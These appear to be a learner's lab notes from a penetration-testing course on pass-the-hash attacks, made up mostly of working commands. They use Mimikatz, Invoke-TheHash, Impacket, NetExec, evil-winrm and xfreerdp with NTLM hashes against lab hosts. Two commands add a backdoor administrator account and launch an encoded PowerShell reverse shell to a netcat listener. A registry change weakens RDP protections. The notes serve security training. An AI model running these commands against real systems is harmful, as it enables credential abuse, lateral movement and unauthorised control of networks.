## Pass the Hash with Mimikatz (Windows)
#### Pass the Hash from Windows Using Mimikatz

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
![[Pasted image 20260510211110.png]]
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
#### Invoke-TheHash with SMB

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\ 
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1 
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
#### Netcat listener

```powershell
PS C:\tools> .\nc.exe -lvnp 8001 
listening on [any] 8001 ...
```
#### Invoke-TheHash with WMI

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1 
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd"

[+] Command executed with process id 520 on DC01
```
The result is a reverse shell connection from the DC01 host (172.16.1.10).
![[Pasted image 20260510211421.png]]
## Pass the Hash with Impacket (Linux)
#### Pass the Hash with Impacket PsExec

```shell
3kjS@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
## Pass the Hash with NetExec (Linux)
#### Pass the Hash with NetExec

```shell
3kjS@htb[/htb]$ netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
#### NetExec - Command Execution

```shell
3kjS@htb[/htb]$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
## Pass the Hash with evil-winrm (Linux)
#### Pass the Hash with evil-winrm

```shell
3kjS@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## Pass the Hash with RDP (Linux)
- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
![[Pasted image 20260510213039.png]]
#### Enable Restricted Admin Mode to allow PtH

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
![[Pasted image 20260510213103.png]]
#### Pass the Hash using RDP

```shell
3kjS@htb[/htb]$ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
![[Pasted image 20260510213124.png]]
## UAC limits Pass the Hash for local accounts

When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.